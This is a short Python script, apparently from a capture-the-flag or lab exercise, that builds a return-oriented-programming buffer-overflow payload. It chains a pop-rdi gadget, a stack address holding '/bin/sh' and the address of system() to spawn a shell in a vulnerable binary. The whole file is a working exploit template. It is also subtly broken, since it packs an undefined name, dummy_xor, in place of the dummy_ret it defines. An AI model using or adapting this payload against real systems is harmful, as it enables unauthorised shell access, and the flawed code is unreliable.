#!/usr/bin/env python
import sys, struct, subprocess, os

pop_rdi_ret = 0x400686 #find this address in gdb-peda>dumprop
buff_addr = 0x7fffffffdd00 # this must point to /bin/sh
# fix alignment segfault which happens in system fuction
dummy_ret = 0x400687 # any ret should do
nop = 0x4004cf # find in gdb-peda>dumprop
system = 0x000000000040f9e0 #gdb-peda>p system

prog1 = '/bin/sh'
buf = "".join(struct.pack('<B', ord(c)) for c in prog1)
buf += '\x00' * (65)

buf += struct.pack('<Q', pop_rdi_ret)
buf += struct.pack('<Q', buff_addr)
buf += struct.pack('<Q', dummy_xor)

buf += struct.pack('<Q', nop)
buf += struct.pack('<Q', nop)
buf += struct.pack('<Q', nop)
buf += struct.pack('<Q', nop)
buf += struct.pack('<Q', nop)
buf += struct.pack('<Q', nop)
buf += struct.pack('<Q', nop)
buf += struct.pack('<Q', nop)
buf += struct.pack('<Q', nop)
buf += struct.pack('<Q', nop)

buf += struct.pack('<Q', system)
sys.stdout.write(buf)
